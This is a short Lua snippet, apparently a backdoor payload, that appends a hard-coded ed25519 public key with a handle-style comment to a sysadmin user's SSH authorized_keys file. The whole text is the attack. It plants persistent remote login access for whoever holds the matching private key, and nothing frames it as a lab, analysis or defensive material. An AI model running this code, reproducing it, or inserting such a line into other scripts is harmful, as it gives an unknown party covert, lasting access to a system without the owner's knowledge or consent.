authkeys = io.open("/home/sysadmin/.ssh/authorized_keys", "a")
authkeys:write("ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIN6c7/nSlXK2w5PhJbgAp+6jooahG8sMslav9oM6bCEp carb0nf1b3r@QuickdrawMcGraw25073\n")
authkeys:close()
